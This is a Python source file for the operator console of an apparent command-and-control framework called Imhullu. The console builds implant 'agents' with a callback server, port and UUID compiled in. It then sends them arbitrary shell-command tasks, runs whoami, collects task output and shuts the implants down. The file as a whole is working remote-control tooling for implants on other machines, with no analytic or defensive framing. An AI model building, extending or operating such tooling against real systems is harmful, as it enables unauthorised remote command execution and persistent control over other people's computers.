import cmd
import functools
import requests
import json
from base64 import b64decode, b64encode
from module.input_usage import InputUsage
from module.input_type import InputType
from module.module_exception import *
import tableprint
import subprocess
import importlib
import os
from module.interface import Interface
from module.interface_messages import InterfaceMessages

UNDERLINE = "\033[4m"
RESET = "\033[0m"

class ImhulluCLI(cmd.Cmd):
    running = 1
    interface = Interface("http://127.0.0.1:5001")
    prompt = f"{UNDERLINE}Imhullu>{RESET} "
    
    def agent_uuid_required(func):
        @functools.wraps(func)  # Preserve metadata, namely the doc string
        def wrapper(self, *args, **kwargs):
            if not self.interface.agent_uuid:
                print("Choose an agent")
                return
            return func(self, *args, **kwargs)
        return wrapper

    # override the default functionality
    # https://docs.python.org/3/library/cmd.html#cmd.Cmd.emptyline
    def emptyline(self):
        print()
        return

    def default(self, line):
        """override the default behavior for unrecognized commands"""
        print(f"Unrecognized command: {line}")
        self.do_help('')

    def do_reload(self, arg):
        """reload ImhulluCLI\n\tUsage: <command>\n"""
        raise ImhulluCLIReloadedException

    # Command to exit the tool
    def do_exit(self, arg):
        """exit the program\n\tUsage: <command>\n"""
        print('Goodbye!')
        self.running = 0
        return True

    # Command to list available commands
    def do_help(self, arg):
        """list available commands\n\tUsage: <command>\n"""
        print()
        if arg == 'all':
            for name, method in self.__class__.__dict__.items():
                if callable(method) and name.startswith('do_'):
                    print(f"{name.removeprefix('do_')}: {method.__doc__}")
            print()
            return

        print("Type `help all` to view every command description")
        super().do_help(arg)
        print()

    def complete_help(self, text, line, begidx, endidx):
        """Provide tab completion for the 'greet' command."""
        params = [method.removeprefix("do_") for method in self.__class__.__dict__.keys() if method.startswith("do_")]
        params.append('all')
        if not text:
            # If no text is entered, return all names
            completions = params[:]
        else:
            # Filter names based on the text entered
            completions = [param for param in params if param.startswith(text)]
        return completions

    def do_change_agent_uuid(self, agent_uuid: str):
        """change current agent uuid\n\tUsage: <command> <agent_uuid>\n"""
        if not agent_uuid:
            print("Usage: " + InputUsage.ChangeAgentUUID.value + '\n')
            return

        self.interface.agent_uuid = agent_uuid
        self.prompt = f"{self.interface.agent_uuid}\n{UNDERLINE}Imhullu>{RESET} ";

    def _compile_agent(self, name, server, port, uuid):
        """modify agent server and port then compiler"""
        pi_server = ''
        pi_uuid = ''
        for char in server:
            pi_server += "'" + char + "'" + ','
        for char in uuid:
            pi_uuid += "'" + char + "'" + ','
            
        pi_server += '0'  # null terminator
        pi_uuid += '0'    # null terminator

        command = ["make", f'SERVER_M="{pi_server}"', f'PORT_M="{port}"', f'UUID_M="{pi_uuid}"']
        print(command[0] + ' ' + command[1] + ' ' + command[2] + ' ' + command[3])
        process = subprocess.Popen(command, cwd="../agent/", stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        while True:
            # Read a line from the output
            output = process.stdout.readline()
            
            # If the output is empty and the process has finished, break the loop
            if output == '' and process.poll() is not None:
                break
            
            # If there is output, print it
            if output:
                print(output.strip())

        # Wait for the process to complete and get the return code
        return_code = process.wait()

    def do_create_agent(self, args):
        """create a new agent\n\t<command> <name> <server> <port>\n"""
        if not args:
            print("Usage: " + InputUsage.CreateAgent.value + '\n')
            return

        args = args.split(' ')
        name = args[0]
        server = args[1]
        port = args[2]

        create_agent_payload = {
            "name": name
        }
        endpoint = "/create_agent/"
        create_agent_payload_json = json.dumps(create_agent_payload)
        uuid = self.interface.api_post_req(endpoint, post_data=create_agent_payload_json)

        self._compile_agent(name, server, port, uuid)

        print(uuid + '\n')

    def _shutdown_agent(self, uuid):
        """send shutdown signal to agent with the relevant uuid"""
        task = {
            "task": "",
            "task_type": InputType.AgentShutdown.value,
            "agent_uuid": uuid
        }

        print(self._create_task(task) + '\n')

    @agent_uuid_required
    def do_shutdown(self, args):
        """terminate implant\n\tUsage: <command>\n"""
        self._shutdown_agent(self.interface.agent_uuid)

    def do_remove_agent(self, uuid):
        """remove agent (WIP and terminate implant)\n\tUsage: <command> <agent_uuid>\n"""
        if not uuid:
            print("Usage: " + InputUsage.RemoveAgent.value + '\n')
            return

        remove_agent_payload = {
            "uuid": uuid
        }

        endpoint = "/remove_agent/"
        remove_agent_payload_json = json.dumps(remove_agent_payload)
        print(self.interface.api_post_req(endpoint, post_data=remove_agent_payload_json))
        print("Agent terminated")

    def do_list_agents(self, args):
        """list every agents\n\tUsage: <command>\n"""
        headers = ['Agent ID', 'Agent UUID', 'Agent Name']
        endpoint = "/agents/"
        output = ""
        agents = self.interface.api_get_req(endpoint)

        if len(agents) == 0:
            print("No agent present")
            return

        tableprint.table(agents, headers)

    @agent_uuid_required
    def do_cmd(self, args):
        """create a new cmd task\n\tUsage: <command> <arg1> <arg2> ...\n"""
        if not args:
            print("Usage: " + InputUsage.Cmd.value + '\n')
            return

        status = self.interface.cmd(args)

        print(status)

    @agent_uuid_required
    def do_whoami(self, line):
        """get user info through GetUserName\n\tUsage: <command>\n"""
        result = self.interface.whoami()
        print(result)

    @agent_uuid_required
    def do_list_tasks(self, args):
        """show a list of all the agents\n\tUsage: <command>\n"""
        headers = ['Task ID', 'Command Args', 'Command Type', 'Agent UUID']
        tasks = self.interface.get_tasks()

        if tasks == InterfaceMessages.TaskQueueEmpty:
            print(InterfaceMessages.TaskQueueEmpty.value + '\n')
            return

        tableprint.table(tasks, headers)

    @agent_uuid_required
    def do_get_task_output(self, args):
        """return the output of the last task\n\tUsage: <command>\n"""
        output = self.interface.get_task_output()
        print(output)
        return

if __name__ == '__main__':
    cli = ImhulluCLI()
    cli.cmdloop()

